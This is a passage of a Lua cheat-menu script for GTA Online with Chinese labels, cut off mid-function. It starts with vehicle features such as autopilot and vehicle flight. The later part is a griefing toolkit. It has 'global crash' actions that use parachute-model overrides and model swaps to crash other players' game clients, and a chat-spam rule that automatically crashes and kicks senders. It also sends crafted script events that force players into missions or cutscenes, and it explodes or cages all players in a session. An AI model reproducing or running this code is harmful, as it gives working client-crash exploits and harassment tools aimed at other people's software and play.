            directx.draw_text(screen_x,screen_y,"向左急转弯 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 4 then
            turn_dir =  math_funcs.lerp(turn_dir, 90, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"右转 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 7 then
            turn_dir =  math_funcs.lerp(turn_dir, 145, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"向右急转弯 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 8 then
            turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
            directx.draw_text(screen_x, screen_y, "正在计算新路线    ", ALIGN_CENTRE, 1, shitty_gps_colour_a)
        else
            turn_dir =  math_funcs.lerp(turn_dir, 0, 5 * delta_time)
        end
        local direction = ENTITY.GET_ENTITY_FORWARD_VECTOR(player_ped_id)
        local angle = b_vectors.new().vector2.get_angle(direction, {x = 0, y = 1})
        if b_vectors.new().vector2.dot({x = direction.x, y = direction.y}, {x = 1, y = 0}) > 0 then
            angle = -angle
        end
        local draw_pos = b_common_funcs.new().get_pos_above_entity(vehicle)
        draw_pos.z = draw_pos.z + 0.4
        drawing_funcs.draw_arrow(draw_pos, angle - math.rad(turn_dir), 1, shitty_gps_colour_a, shitty_gps_colour_b)
    end

    return shitty_gps_run
    end)
    else
        memory.free(p_distToNxJunction)
        memory.free(p_direction)
        memory.free(p_5)
        memory.free(p_screenX)
        memory.free(p_screenY)
    end
end)

    local jesus_main = menu.list(carfly, "自动驾驶", {}, "")
    menu.slider_text(jesus_main, "驾驶风格", {}, "单击以选择样式", style_names, function(index, value)
        pluto_switch value do
            case "正常":
                style = 786603
                break
            case "冲刺":
                style = 1074528293
                break
            case "半冲刺":
                style = 8388614
                break
            case "反向":
                style = 1076
                break
            case "无视红绿灯":
                style = 2883621
                break
            case "避开交通":
                style = 786603
                break
            case "极度避开交通":
                style = 6
                break
            case "有时超车":
                style = 5
                break
            end
        end)
        
    jesus_toggle = menu.toggle(jesus_main, "启用", {}, "", function(toggled)
        if toggled then
            local player = players.user_ped()
            local pos = ENTITY.GET_ENTITY_COORDS(player, false)
            local player_veh = entities.get_user_vehicle_as_handle()
    
            if not PED.IS_PED_IN_ANY_VEHICLE(player, false) then 
                util.toast("请在载具里使用. :)")
            return end
    
            local jesus = util.joaat("u_m_m_jewelsec_01")
            request_model(jesus)
    
            
            jesus_ped = entities.create_ped(26, jesus, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jesus_ped, true)
            PED.SET_PED_INTO_VEHICLE(player, player_veh, -2)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, player_veh, -1)
            PED.SET_PED_KEEP_TASK(jesus_ped, true)
    
            if HUD.IS_WAYPOINT_ACTIVE() then
                local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
                TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(jesus_ped, player_veh, pos.x, pos.y, pos.z, 9999, style, 0)
            else
                util.toast("请先设置一个导航点. :/")
                    menu.set_value(jesus_toggle, false)
            end
        else
            if jesus_ped ~= nil then 
                entities.delete_by_handle(jesus_ped)
            end
        end
    end)

menu.toggle_loop(carfly, "显示载具旋转和速度", {}, "", function()
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velMag = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --[[
        x = left/right
        y = forward/backward
        z = up/down
    ]]
    local entSpeed = ENTITY.GET_ENTITY_SPEED(veh)
    directx.draw_text(0.07, 0, "高度: " .. v3.getX(vv), 1, 0.7, WhiteText, false)
    directx.draw_text(0.07, 0.02, "弯度: " .. v3.getY(vv), 1, 0.7, WhiteText, false)
    directx.draw_text(0.07, 0.04, "偏移度: " .. v3.getZ(vv), 1, 0.7, WhiteText, false)
    directx.draw_text(0.07, 0.06, "加速度: " .. tostring(velMag), 1, 0.7, WhiteText, false)
    directx.draw_text(0.07, 0.08, "速度: " .. tostring(entSpeed), 1, 0.7, WhiteText, false)
end)

menu.toggle(carfly, '车辆生成', {'Valiases'}, '激活用于生成的车辆名称别名列表，如果多人运行它，您可以使用它来关闭它', function (on)
    valiases_spawn.vehicle_alias = on
end)

valiases_spawn.vehicle_aliases = menu.list(carfly, '车辆生成列表', {}, '用于生成的车辆名称别名列表')
veh_spawn_see()

mph_unit = "KPH"
menu.list_action(speedometer_plate_root, "速度单位", {}, "", {"KPH", "MPH"}, function(index, value, click_type)
    mph_unit = value
end)

local chauffeur_root = menu.list(carfly, "司机服务", {}, "呼叫您的私人司机.")

menu.list_action(chauffeur_root, "传唤司机", {"summonchauffeur"}, "", {"Stretch", "T20", "Kuruma"}, function(index, value, click_type)
    summ_car(index, value)
end)

menu.action(chauffeur_root, "驾车前往航点", {}, "", function(click_type)
    summ_car_topoint()
end)

menu.action(chauffeur_root, "传送到驾驶室", {}, "", function(click_type)
    summ_car_tp()
end)

menu.action(chauffeur_root, "自我毁灭", {}, "", function(click_type)
    summ_car_bmob()
end)

local vehicle_fly = menu.list(carfly, "载具飞行", {}, "")

menu.toggle_loop(carfly, "载具效果", {}, "", function ()
    cargoodeffect()
end)

menu.slider_text(carfly,"设置载具效果", {}, "", carvis, function (index)
    set_carvis(index) 
end)

local fastTurnVehicleScale = 3

menu.toggle_loop(carfly, "车辆快速自定义转弯", {}, "用 A/D 键快速转动您的车辆。", function ()
    FastTurnVehicleWithKeys(fastTurnVehicleScale)
end)

menu.slider(carfly, "车辆快速自定义转弯刻度（/10)", {}, "设置自定义转弯的比例。", 1, 1000, 30, 5, function(value)
    fastTurnVehicleScale = value / 10
end)

	menu.action(carfly, translate("Player - Vehicle", "清洁载具"), {"cleanvehicle"}, "", function()
		local vehicle = get_vehicle_player_is_in(pId)
		if ENTITY.DOES_ENTITY_EXIST(vehicle) and request_control(vehicle, 1000) then
			VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, 0.0)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

menu.click_slider(carfly, translate("Player - Vehicle", "设置污垢级别"), {""}, "", 0, 15, 0, 1, function(s)
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(player_cur_car, s)
    end
end)

menu.toggle_loop(carfly, "隐藏载具无敌", {}, "不会被大多数菜单检测", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), false, false, false, false, false, 0, 0, false)
end)

local rgbvm = menu.list(carfly, '彩虹载具', {}, '')

menu.toggle_loop(rgbvm, '彩虹载具', {}, '将载具颜色和霓虹灯更改为彩色', function ()
    rainbow_car()
end)

menu.slider(rgbvm, '速度', {''}, '调整车漆颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_rainbowcar(c)
end)

menu.toggle_loop(rgbvm, '彩虹大灯', {}, '将霓虹灯/大灯/内饰更改为相同颜色', function ()
    rainbow_car_light()
end)
  
menu.slider(rgbvm, '速度', {''}, '调整灯光颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_light(c)
end)

menu.toggle_loop(carfly, "目标乘客能力", {}, "允许你射击载具内的其他乘客", function()
    hittheplayerincar()
end)

noaccident = false
menu.toggle(carfly, "避免事故", {"accidentavoidance"}, "使用全新技术避免车祸。特斯拉认证。仍然需要具备一定的驾驶能力", function(on)
    if on then
        noaccident = true
        aa_thread()
    else
        noaccident = false
    end
end)

menu.toggle(carfly, '减少翘头', {'Rburnout'}, '使载具不容易翘头,主要针对于肌肉车的翘头减速', function (tog)
    PHYSICS.SET_IN_ARENA_MODE(tog)
end)

renderscorched = false
menu.toggle(carfly, "烤焦", {"renderscorched"}, "使你的车烧焦", function(on)
    if on then
        renderscorched = true
    else
        renderscorched = false
        if player_cur_car ~= 0 then
            ENTITY.SET_ENTITY_RENDER_SCORCHED(player_cur_car, false)
        end
    end
end, false)

menu.action(carfly, "强行离开载具", {"forceleaveveh"}, "紧急情况下强行离开车辆", function(click_type)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
    TASK.TASK_LEAVE_ANY_VEHICLE(players.user_ped(), 0, 16)
end)

menu.click_slider(carfly, "设置脏污级别", {"setdirtlevel"}, "", 0, 15, 0, 1, function(s)
    setcardirty(s)
end)

menu.click_slider(carfly, "垂直堆叠", {"stackvehvert"}, "", 1, 10, 3, 1, function(s)
    setstacky(s)
end)

menu.click_slider(carfly, "水平堆叠", {"stackvehhoriz"}, "", 1, 10, 3, 1, function(s)
    setstackx(s)
end)

menu.toggle_loop(carfly, "随机升级", {}, "仅适用于您出于某种原因生成的车辆", function()
    ramdomupdatecar()
end)

menu.toggle_loop(carfly, "强制生成反制系统", {"forcecms"}, "当您使用鸣笛键时,在任何载具中强制执行反制系统", function(on)
    forcecmsoncar()
end)

menu.action(carfly, "特斯拉召唤", {"teslasummon"}, "让你的车自动开过来。由于多种原因经常中断,但这太有趣了,不能放弃。", function(click_type)
    teslasummoncar()
end)

menu.toggle_loop(carfly, "喇叭轰炸", {"lshornspam"}, "", function(toggle)
    carlshormspam()
end)

menu.toggle(vehicle_fly, "载具飞行", {"vehfly"}, "我建议为此选项设置热键。", function(on_click)
    is_vehicle_flying = on_click
end)

menu.slider(vehicle_fly, "速度", {"speed"}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(vehicle_fly, "触发后不停止", {"dontstop"}, "", function(on_click)
    dont_stop = on_click
end)

menu.toggle(vehicle_fly, "无碰撞", {"nocolision"}, "", function(on_click)
    no_collision = on_click
end)


util.create_tick_handler(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE); end
    return true
end)
util.on_stop(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true)
	ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE);
end)
 

local bodyguardMenu <const> = BodyguardMenu.new(funfeatures, "保镖选项", {})

menu.click_slider(visuals, "醉酒模式", {}, "", 0, 5, 1, 1, function(val)
    drunkmode(val)
end)

visual_setting()

local allcrash = menu.list(custselc, "全局崩溃", {}, "", function(); end)

local allguyssound = menu.list(custselc, "全局声音", {}, "", function(); end)

local allevent = menu.list(custselc, "全局事件", {}, "", function(); end)

apforcedacts_root = menu.list(custselc, "强迫载具行动", {"apforcedacts"}, "")

menu.action(apforcedacts_root, "传送载具到我", {"tpavtome"}, "这可能有效，也可能无效。如果这不起作用，它不是一个bug", function(on_click)
    tp_all_player_cars_to_coords(ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
end)

forceteleplace()


    local antichatspam = menu.list(custselc, '反聊天轰炸', {}, '')

    local messageTable = {}
    chat.on_message(function(pid, message_sender, text, team_chat)
        if pid == players.user() then return end
        if not chatSpamSettings.enabled then return end
        if team_chat and chatSpamSettings.ignoreTeam then return end

        if messageTable[pid] == nil then
            messageTable[pid] = {}
        end

        local messageCount = (#messageTable[pid] != nil and #messageTable[pid] or 0)
        messageTable[pid][messageCount + 1] = text

        if #messageTable[pid] < chatSpamSettings.identicalMessages then return end
        for i = 1, #messageTable[pid] - 1 do
            if messageTable[pid][#messageTable[pid]] != messageTable[pid][#messageTable[pid] - i] then
                messageTable[pid] = {}
                return
            end
            if i == #messageTable[pid] - 1 then
                menu.trigger_commands('crash'.. players.get_name(pid))
                menu.trigger_commands('kick'.. players.get_name(pid))
                util.toast('玩家' ..' '.. players.get_name(pid) ..' '.. '因聊天轰炸已被踢出')
            end
        end
    end)

    menu.toggle(antichatspam, '反聊天轰炸', {'antiChatSpam'}, '如果有人不断发送相同的聊天信息则踢/崩他们.', function(toggle)
        chatSpamSettings.enabled = toggle
    end)

    menu.toggle(antichatspam, '忽略团队聊天', {'ignoreTeamSpam'}, '', function(toggle)
        chatSpamSettings.enabled = toggle
    end, chatSpamSettings.ignoreTeam)

    menu.slider(antichatspam, '相同信息', {'identicalChatMessages'}, '玩家在被踢之前可以发送多少条相同的聊天消息.', 2, 9999, chatSpamSettings.identicalMessages, 1, function(value)
        chatSpamSettings.identicalMessages = value
    end)

    local colouredotr = menu.list(custselc, '标记人间蒸发玩家', {}, '')

    menu.toggle_loop(colouredotr, '标记人间蒸发玩家', {'colouredOtrReveal'}, '用彩色光点标记人间蒸发的玩家.', function()
        local playerList = players.list(false, true, true)
        for i, pid in pairs(playerList) do
            if players.is_otr(pid) and not markedPlayers[pid] then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                markedPlayers[pid] = HUD.ADD_BLIP_FOR_ENTITY(ped)
                HUD.SET_BLIP_COLOUR(markedPlayers[pid], otrBlipColour)
                HUD.SHOW_HEADING_INDICATOR_ON_BLIP(markedPlayers[pid], true)
            elseif players.is_otr(pid) then
                HUD.SET_BLIP_COLOUR(markedPlayers[pid], otrBlipColour)
            elseif not players.is_otr(pid) and markedPlayers[pid] then
                util.remove_blip(markedPlayers[pid])
                markedPlayers[pid] = nil
            end
        end
    end, function()
        local playerList = players.list(false, true, true)
        for i, pid in pairs(playerList) do
            if markedPlayers[pid] then
                util.remove_blip(markedPlayers[pid])
                markedPlayers[pid] = nil
            end
        end
    end)

    local otr_colour_slider = menu.slider(colouredotr, '人间蒸发 显示颜色', {'ortRevealColour'}, '',1, 81, otrBlipColour, 1, function(value)
        otrBlipColour = value + (value > 71 and 1 or 0) + (value > 77 and 2 or 0)
    end)

    menu.toggle_loop(colouredotr, '人间蒸发 rgb颜色', {'JSortRgbReveal'}, '', function()
        menu.set_value(otr_colour_slider, (otrBlipColour == 84 and 1 or otrBlipColour + 1))
        util.yield(250)
    end)

    menu.action(allevent, "发送所有玩家海滩", {}, "", function () 
        sendscriptevent_one()
    end)

    menu.action(allevent, "发送所有玩家岛屿", {}, "", function () 
        sendscriptevent_two()
    end)

    menu.action(allevent, "全局公寓邀请", {}, "", function () 
        sendscriptevent_three()
    end)

    menu.action(allevent, "全局送进任务", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			util.trigger_script_event(1 << pid, {1858712297, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), pid})

		end

	end

end)

    menu.action(allevent, "困住所有玩家", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))

				pos.z = pos.z + 0.95  

				local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))

				pos1.z = pos1.z - 0.90

				local cage = util.joaat("prop_feeder1_cr")

				STREAMING.REQUEST_MODEL(cage)

				OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos.x, pos.y ,pos.z , true, true)

				OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos1.x, pos1.y ,pos1.z , true, true)

        end

	end

end)

    menu.toggle_loop(allevent, "全局随机事件", {}, "", function () 

    for pid = 0, 31 do

		if pid ~= players.user() and players.exists(pid) then

			local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local coords = ENTITY.GET_ENTITY_COORDS(target_ped)

            FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false,0.0)

        end

    end

menu.toggle_loop(allevent, "震动屏幕", {}, "让每个人的屏幕震动", function()
    for k,v in pairs(players.list(false, true, true)) do
        shake_player(v, 5000)
        util.yield()
    end
    util.yield(1000)
end)

    menu.toggle_loop(allevent, '爆炸所有人', {'explodeAll'}, '爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, pid in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explodePlayer(playerPed, false, expSettings)
    end
end)

menu.toggle(allevent, "停电", {"poweroutage"}, "", function(toggled)
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
end)

menu.toggle(allevent, "停电2", {"blackout"}, "", function(toggled)
    menu.trigger_commands("time 1")
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
    if toggled then
        GRAPHICS.SET_TIMECYCLE_MODIFIER("dlc_island_vault")
    else
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    end
end)

    menu.toggle_loop(allevent, "混乱车辆", {}, "车辆到处乱窜",
    function()
        for i, veh in ipairs(entities.get_all_vehicles_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0.0, 10.0, 0.0, true, true, true, true) -- alternatively, VEHICLE.SET_VEHICLE_FORWARD_SPEED(...) -- not tested
        end
    end
)
    menu.toggle(allevent, "暴乱城市", {}, "周围的npc会进入无差别攻击模式！", function(toggle)
        MISC.SET_RIOT_MODE_ENABLED(toggle)
    end)

end)

menu.toggle_loop(allevent,  "赌场陷阱", {"trapbase"}, "", function() 
    local mdl = util.joaat("hei_prop_ss1_mpint_garage2")
    request_model(mdl)
    if trap_obj == nil or trap_obj2 == nil or not ENTITY.DOES_ENTITY_EXIST(trap_obj) or not ENTITY.DOES_ENTITY_EXIST(trap_obj2) then
        trap_obj = entities.create_object(mdl, v3(1089.62, 206.334, -48.473))
        trap_obj2 = entities.create_object(mdl, v3(1090.0166, 213.826, -48.473))
        ENTITY.SET_ENTITY_HEADING(trap_obj2, 31.0)
        local objs = {trap_obj, trap_obj2}
        for _, obj in objs do
            entities.set_can_migrate(entities.handle_to_pointer(obj), false)
            ENTITY.FREEZE_ENTITY_POSITION(obj, true)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(players.user_ped(), obj, false)
        end
    end
    util.yield()
end, function()
    local objs = {trap_obj, trap_obj2}
    for _, obj in objs do
        if obj ~= nil then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(obj)
            entities.delete_by_handle(obj)
        end
    end
end)

menu.action(allevent, "发送到介绍界面", {"introall"}, "将战局中的每个人都送到GTAOnline的介绍动画中去.", function()
    for _, pid in players.list(false, true, true) do
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))  -- Global_1894573[PLAYER::PLAYER_ID() /*608*/].f_510
        if not StandUser(pid) then
            util.trigger_script_event(1 << pid, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
            util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end
end)

menu.action(allevent, "发送到高尔夫俱乐部", {"golf"}, "让战局中所有人都去打高尔夫.", function()
    for _, pid in players.list(false, true, true) do
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        if not StandUser(pid) then
            util.trigger_script_event(1 << pid, {-95341040, players.user(), 193, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
            util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end
end)

menu.action(allevent, "将所有人传送到海洋", {"alltpvehocean"}, "", function()
    TeleportEveryonesVehicleToOcean()
end)

menu.action(allevent, "将所有人传送到花园银行楼顶 ", {"alltpvehmazebank"}, "", function()
    TeleportEveryonesVehicleToMazeBank()
end)
VehTeleportLoadIterations = 20
menu.slider(allevent, "循环加载载具传送", {"vehloaditerations"}, "请记住,每次循环都是十分之一秒.默认值为20秒或2秒.", 1, 100, 20, 1, function(value)
    VehTeleportLoadIterations = value
end)

menu.action(allevent, "移除所有人的载具无敌", {"allremovevehgod"}, "", function ()
    RemoveVehicleGodmodeForAll()
end)

    menu.toggle_loop(allevent, "自由模式死亡", {"allfdeath"}, "可能对某些/大多数菜单不起作用. 各种各样的'延迟踢'.", function ()
        FreemodeDeathAll()
    end)

menu.toggle_loop(allevent, "加入战局时向玩家敬酒", {}, "", function ()
    CheckLobbyForPlayers()
end)

    function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
menu.action(allevent, "战局雪天", {}, "", function () 
    --memory.script_global(262145+4752,0)
    SET_INT_GLOBAL(262145+4752,1)
end)

    menu.toggle_loop(allevent, "打雷", {""}, "闪电生成", function()
        MISC.FORCE_LIGHTNING_FLASH()
    end)

    menu.toggle(allevent, "飞机坠落", {},"各种飞机坠毁事件", function(on)
        angry_planes = on
        start_angryplanes_thread()
    end)

    menu.toggle(allevent, '定点轰炸', {'JSnukeWP'}, '选择标记点', function ()
        lhbj()
    end)


    menu.action(allguyssound, "防空警报", {"AirDefencesSound"}, "", function()
        fangkongjingbao()
    end)
            
    menu.action(allguyssound, "噪音", {"bedsound", "earrape"}, "在战局中播放大量的噪音", function()
        zaoyin()
    end)

    function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(allcrash, listName .. " handle " .. handle, {}, "")
        menu.action(lis, "删除", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "传送到实体", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "驾驶实体", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "传送到我", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end
planes = {'microlight', 'cuban800', 'tula', 'alphaz1', 'velum2', 'nimbus', 'seabreeze'} -- 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed', 'proptrailer', 'tr4'
coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
to_ply = 1

crashr = menu.list(allcrash, '全局崩溃', {}, '')

    function Change_player_model(hash)
    local model_hash = hash
    STREAMING.REQUEST_MODEL(model_hash)
    while(not STREAMING.HAS_MODEL_LOADED(model_hash))
    do
		util.yield(0)
    end
    PLAYER.SET_PLAYER_MODEL(model_hash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(model_hash)
end
 menu.action(crashr,"改进的懂哥崩溃",{}, "", function()
    Change_player_model(0x9C9EFFD8)
    local land_area = {
        v3(1798.031,-2831.863,3.562),
        v3(-245.300,-656.019,33.168),
        v3(-2561.787,3175.436,32.820),
        v3(58.667,7198.895,3.372),
        v3(1279.582,3064.881,40.534),
        v3(3003.555,5777.601,300.729),
        v3(460.582,5572.078,781.179),
        v3(3615.213,5024.245,11.396),
        v3(3668.583,5645.834,11.537),
        v3(2027.388,-1588.856,251.008),
        v3(-1240.75,-587.97,27.25)
        }
    for i ,crashpos in pairs(land_area) do
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
    util.yield(0)
        local crash_num = 2
        pack_crash = util.create_thread(function()
            while crash_num == 2 do
                    for set_para_packmodel = 0 ,50 do
                        crash_pack = ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(players.user(),util.joaat("v_res_tt_fridge"))
                        util.yield(100)      				
                    end
                end
        end,nil)
        pos = crashpos
        pos.z = pos.z + 0.22
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crashpos, pos.x, pos.y, pos.z)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(players.user_ped(players.user()),0xFBAB5776,1000,false)
        TASK.TASK_PARACHUTE_TO_TARGET(players.user_ped(players.user()),-1087,-3012,13.94)
        util.yield(600)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))		
        util.yield(1000)
    end
    ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(players.user()) 
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()),-1087,-3012,13.94)
end)

sancrashr = menu.list(crashr, '全局伞崩', {}, '')

    menu.action(sancrashr, "载具伞崩V1", {}, "崩溃全局", function ()
        carcrashv1()
    end)

menu.action(sancrashr, "载具伞崩V2", {}, "", function ()
    notification("开始崩溃，请反复按空格键")
local spped = PLAYER.PLAYER_PED_ID()
local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
    local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
    PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
    util.yield(200)
    VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 148511758)
    VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
    util.yield(300000)
    entities.delete_by_handle(Ruiner2)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
end)

menu.action(sancrashr, "载具伞崩V3", {}, "", function ()
    notification("开始崩溃")
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    --^^
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    ---^^
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(100)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	3235319999)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2000, false, true, true)
        util.yield(120)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	260873931)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(120)
        entities.delete_by_handle(Ruiner2)
    end

    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(100)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, 	546252211)
        VEHICLE.VEHICLE_START_PARACHUTING(Ruiner2, true)
        util.yield(100)
        entities.delete_by_handle(Ruiner2)
    end


    for i = 1, 8 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
